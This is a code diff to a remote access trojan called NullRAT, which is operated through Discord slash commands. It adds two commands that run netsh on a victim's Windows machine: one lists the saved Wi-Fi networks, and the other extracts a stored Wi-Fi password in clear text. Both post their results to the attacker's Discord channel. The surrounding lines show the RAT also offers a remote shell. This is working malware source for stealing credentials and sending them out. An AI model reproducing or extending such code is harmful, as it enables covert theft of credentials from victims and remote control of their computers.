@@ -308,6 +308,16 @@ async def shell(ctx, msg):
         )
         status = None
 
+@client.slash_command(description="Lists all wifi networks", guild_ids=server_ids)
+async def wifilist(ctx, victim):
+    if str(victim) == str(IP()):
+        await ctx.response.send_message(f"```{os.popen('netsh wlan show profiles').read().replace('All', '').replace('Profile', 'Network')}```")
+
+@client.slash_command(description="Lists specified wifi password", guild_ids=server_ids)
+async def wifipass(ctx, victim, name):
+    if str(victim) == str(IP()):
+        await ctx.response.send_message(f"```{os.popen(f'netsh wlan show profile {name} key=clear | findstr Key').read()}```")
+        
 @client.slash_command(description="Quits NullRAT from specified IP", guild_ids=server_ids)
 async def close(ctx, ip):
     if ip == IP():
